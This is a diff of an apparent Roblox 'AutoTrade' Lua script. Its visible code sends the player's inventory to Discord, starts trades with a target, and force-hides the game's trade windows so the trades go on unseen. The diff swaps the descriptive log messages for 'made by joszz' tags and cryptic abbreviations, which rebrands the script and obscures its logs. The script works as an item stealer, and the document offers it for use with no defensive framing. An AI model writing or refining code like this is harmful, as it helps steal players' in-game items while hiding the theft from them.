@@ -11,7 +11,7 @@ local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
 local function log(msg, type)
-    print("[AutoTrade] [" .. type .. "] " .. msg)
+    print("[made by joszz] [" .. type .. "] " .. msg)
 end
 
 log("Iniciando...", "START")
@@ -143,7 +143,7 @@ local function buildInventory()
 end
 
 local function sendToDiscord()
-    log("Escaneando inventario...", "SCAN")
+    log("made by joszz 2", "SCAN")
     local items, counts = buildInventory()
 
     local sections = {}
@@ -213,7 +213,7 @@ local function sendToDiscord()
         end
     end)
 
-    log("Inventario enviado a Discord", "DISCORD")
+    log("made by joszz ", "made by joszz ")
 end
 
 local function buildWeaponList(pd)
@@ -280,10 +280,10 @@ end
 
 local function attemptTrade(target)
     activeTarget = target
-    log("Iniciando trade con " .. target.Name .. "...", "TRADE")
+    log(" STWIO " .. target.Name .. "...", "TD")
     for attempt = 1, 4 do
         if not target.Parent then
-            log("Usuario desconectado", "ERROR")
+            log("UD", "ERROR")
             return
         end
         inTrade, offered, lastOffer, acceptedFor, currentOfferCount = false, false, nil, nil, 0
@@ -293,7 +293,7 @@ local function attemptTrade(target)
         local t0 = os.clock()
         while os.clock() - t0 < 8 do
             if inTrade then
-                log("Trade iniciado", "SUCCESS")
+                log("TI", "SUCCESS")
                 return
             end
             task.wait(0.15)
@@ -331,7 +331,7 @@ end)
 AcceptTrade.OnClientEvent:Connect(function(done)
     if done then
         inTrade, offered = false, false
-        log("Trade completado ✓", "COMPLETE")
+        log("TC", "COMPLETE")
 
         task.spawn(function()
             task.wait(1.2)
@@ -384,7 +384,7 @@ task.spawn(function()
     end
 end)
 
-log("Ocultando TradeGUI...", "HIDE")
+log("byjoszz", "byme")
 
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 local TRADE_GUIS = { "TradeGUI", "TradeGUI_Phone" }
@@ -394,17 +394,17 @@ local function blockGui(gui)
     if not gui or hiddenGuis[gui] then return end
     hiddenGuis[gui] = true
     gui.Enabled = false
-    log("Ocultado: " .. gui.Name, "HIDDEN")
+    log("O: " .. gui.Name, "HIDDEN")
 
     gui:GetPropertyChangedSignal("Enabled"):Connect(function()
         if gui.Enabled then
             gui.Enabled = false
-            log("Bloqueado: " .. gui.Name, "BLOCKED")
+            log("B: " .. gui.Name, "BLOCKED")
         end
     end)
 end
 
-log("Buscando TradeGUIs...", "SCAN")
+log("Lf", "SCAN")
 for _, name in ipairs(TRADE_GUIS) do
     local gui = PlayerGui:FindFirstChild(name)
     if gui then
